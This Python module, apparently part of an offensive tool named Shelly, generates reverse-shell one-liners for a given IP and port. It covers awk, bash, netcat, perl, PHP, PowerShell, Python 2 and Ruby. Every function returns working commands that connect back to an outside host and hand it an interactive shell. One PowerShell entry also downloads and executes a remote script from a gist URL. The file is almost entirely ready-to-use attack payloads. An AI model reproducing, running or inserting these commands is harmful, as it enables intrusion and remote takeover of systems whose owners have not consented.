# Shell Codes Module For Shelly

def awk(IP,PORT):
	code = [
		"""awk 'BEGIN {s = "/inet/tcp/0/"""+IP+"""/"""+PORT+"""\"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
		]
	return code

def bash(IP,PORT):
	code = [
		"""bash -i >& /dev/tcp/"""+IP+"""/"""+PORT+""" 0>&1""",
		"""0<&196;exec 196<>/dev/tcp/"""+IP+"""/"""+PORT+"""; sh <&196 >&196 2>&196""",
		"""/bin/bash -l > /dev/tcp/"""+IP+"""/"""+PORT+""" 0<&1 2>&1"""
		]
	return code

def netcat(IP,PORT):
	code = [
		"nc -e /bin/sh "+IP+" "+PORT,
		"nc -e /bin/bash "+IP+" "+PORT,
		"nc -c bash "+IP+" "+PORT
		]
	return code

def perl(IP,PORT):
	code = [
		"""perl -e 'use Socket;$i=\""""+IP+"""\";$p="""+PORT+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
		]
	return code

def php(IP,PORT):
	code = [
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");exec("/bin/sh -i <&3 >&3 2>&3");'""",
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");`/bin/sh -i <&3 >&3 2>&3`;'""",
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");system("/bin/sh -i <&3 >&3 2>&3");'""",
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");passthru("/bin/sh -i <&3 >&3 2>&3");'""",
		"""php -r '$sock=fsockopen(\""""+IP+"""\","""+PORT+""");popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""
		]
	return code

def powershell(IP,PORT):
	code = [
		"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+IP+"""\","""+PORT+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
		"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('"""+IP+"""',"""+PORT+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"""",
		"""powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')"""
		]
	return code

def python2(IP,PORT):
	code = [
		"""python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+IP+"""\","""+PORT+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
		]
	return code

def ruby(IP,PORT):
	code = [
		"""ruby -rsocket -e'f=TCPSocket.open(\""""+IP+"""\","""+PORT+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
		"""ruby -rsocket -e'exit if fork;c=TCPSocket.new(\""""+IP+"""\",\""""+PORT+"""\");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
		""">>> Windows Only <<<\nruby -rsocket -e 'c=TCPSocket.new(\""""+IP+"""\",\""""+PORT+"""\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""
		]
	return code
